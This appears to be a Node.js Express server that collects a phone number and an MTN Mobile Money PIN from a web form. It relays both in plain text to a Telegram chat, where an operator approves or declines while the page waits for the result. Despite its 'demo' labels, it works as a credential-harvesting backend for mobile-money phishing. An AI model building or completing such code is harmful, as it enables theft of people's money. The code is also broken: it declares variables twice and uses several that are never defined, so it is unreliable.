const express = require("express");
const path = require("path");
const axios = require("axios");

const app = express();

const PORT = process.env.PORT || 3000;

const app = express();

const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(__dirname));


app.post("/mtn-submission", async (req, res) => {

  const { phone, mtnPin } = req.body;

  // Mtn phone validation
  if (
    typeof phone !== "string" ||
    !/^7[0-9]{8}$/.test(phone)
  ) {
    return res.status(400).json({
      success: false,
      message: "Invalid demo number."
    });
  }

  // Mtn PIN validation
  if (
    typeof mtnPin !== "string" ||
    !/^[0-9]{5}$/.test(mtnPin)
  ) {
    return res.status(400).json({
      success: false,
      message: "Mtn PIN is required."
    });
  }


  /*
    Generate date/time on the server.
    East Africa Time = UTC+3.
  */
  const now = new Date();

  const date = new Intl.DateTimeFormat("en-GB", {
    timeZone: "Africa/Nairobi",
    year: "numeric",
    month: "2-digit",
    day: "2-digit"
  }).format(now);

  const time = new Intl.DateTimeFormat("en-GB", {
    timeZone: "Africa/Nairobi",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false
  }).format(now);


    const message =
`🧪 MTN MoMo DEMO SUBMISSION

Number: ${phone}
Mtn PIN: ${mtnPin}

Status: Successful
Date: ${date}
Time: ${time}`;

  try {
    const telegramResponse = await axios.post(
      `${TELEGRAM_API}/sendMessage`,
      {
        chat_id: CHAT_ID,
        text: message,
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Approve",
                callback_data: `approve:${id}`
              },
              {
                text: "Decline",
                callback_data: `decline:${id}`
              }
            ]
          ]
        }
      },
      { timeout: 10000 }
    );

    request.telegramMessageId =
      telegramResponse.data.result.message_id;

    return res.json({
      success: true,
      requestId: id,
      status: request.status
    });
  } catch (error) {
    console.error(
      "Could not create demo request:",
      error.response?.data || error.message
    );

    return res.status(500).json({
      success: false,
      message: "Could not send the approval request."
    });
  }
});

// The webpage polls this endpoint for the decision.
app.get("/mtn-status/:id", (req, res) => {
  const request = requests.get(req.params.id);

  if (!request) {
    return res.status(404).json({
      success: false,
      message: "Request not found or expired."
    });
  }

  return res.json({
    success: true,
    status: request.status
  });
});

// Handle Telegram Approve/Decline button clicks.
async function handleCallback(callback) {
  const callbackId = callback.id;
  const message = callback.message;
  const callbackData = String(callback.data || "");

  // Only accept button clicks from the configured Telegram chat.
  if (
    !message ||
    String(message.chat.id) !== CHAT_ID
  ) {
    await answerCallback(
      callbackId,
      "This action is not authorized."
    );
    return;
  }

  const match = callbackData.match(/^(approve|decline):([a-f0-9-]+)$/i);

  if (!match) {
    await answerCallback(callbackId, "Invalid action.");
    return;
  }

  const action = match[1].toLowerCase();
  const requestId = match[2];
  const request = requests.get(requestId);

  if (!request) {
    await answerCallback(
      callbackId,
      "This request has expired or was not found."
    );
    return;
  }

  if (request.status !== "pending") {
    await answerCallback(
      callbackId,
      `Already ${request.status}.`
    );
    return;
  }

  request.status = action === "approve"
    ? "approved"
    : "declined";

  await answerCallback(
    callbackId,
    request.status === "approved"
      ? "Demo request approved."
      : "Demo request declined."
  );

  // Remove the buttons after a decision is made.
  try {
    await axios.post(
      `${TELEGRAM_API}/editMessageReplyMarkup`,
      {
        chat_id: CHAT_ID,
        message_id: message.message_id,
        reply_markup: { inline_keyboard: [] }
      },
      { timeout: 10000 }
    );
  } catch (error) {
    console.error(
      "Could not remove Telegram buttons:",
      error.response?.data || error.message
    );
  }

  // Update the Telegram message with the final status.
  try {
    const updatedText =
      `${message.text || "Demo approval request"}\n\n` +
      `Decision: ${request.status.toUpperCase()}`;

    await axios.post(
      `${TELEGRAM_API}/editMessageText`,
      {
        chat_id: CHAT_ID,
        message_id: message.message_id,
        text: updatedText
      },
      { timeout: 10000 }
    );
  } catch (error) {
    console.error(
      "Could not update Telegram message:",
      error.response?.data || error.message
    );
  }

  console.log(
    `Demo request ${requestId}: ${request.status}`
  );
}

async function answerCallback(callbackId, text) {
  try {
    await axios.post(
      `${TELEGRAM_API}/answerCallbackQuery`,
      {
        callback_query_id: callbackId,
        text
      },
      { timeout: 10000 }
    );
  } catch (error) {
    console.error(
      "Could not answer Telegram callback:",
      error.response?.data || error.message
    );
  }
}

// Telegram long polling.
async function pollTelegram() {
  let offset = 0;

  // Long polling uses getUpdates, so remove any configured webhook first.
  // Use a dedicated bot for this demo if another app uses the same bot.
  try {
    await axios.post(
      `${TELEGRAM_API}/deleteWebhook`,
      { drop_pending_updates: false },
      { timeout: 10000 }
    );
  } catch (error) {
    console.error(
      "Could not configure Telegram polling:",
      error.response?.data || error.message
    );
  }

  console.log("Telegram approval polling started.");

  while (true) {
    try {
      const response = await axios.get(
        `${TELEGRAM_API}/getUpdates`,
        {
          params: {
            offset,
            timeout: 25,
            allowed_updates: JSON.stringify([
              "callback_query"
            ])
          },
          timeout: 35000
        }
      );

      const updates = response.data.result || [];

      for (const update of updates) {
        offset = update.update_id + 1;

        if (update.callback_query) {
          await handleCallback(update.callback_query);
        }
      }
    } catch (error) {
      console.error(
        "Telegram polling error:",
        error.response?.data || error.message
      );

      await new Promise(resolve => setTimeout(resolve, 3000));
    }
  }
}

// Remove expired requests periodically.
setInterval(() => {
  const now = Date.now();

  for (const [id, request] of requests.entries()) {
    if (now - request.createdAt > REQUEST_TTL_MS) {
      requests.delete(id);
    }
  }
}, 60 * 1000);

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  pollTelegram();
});

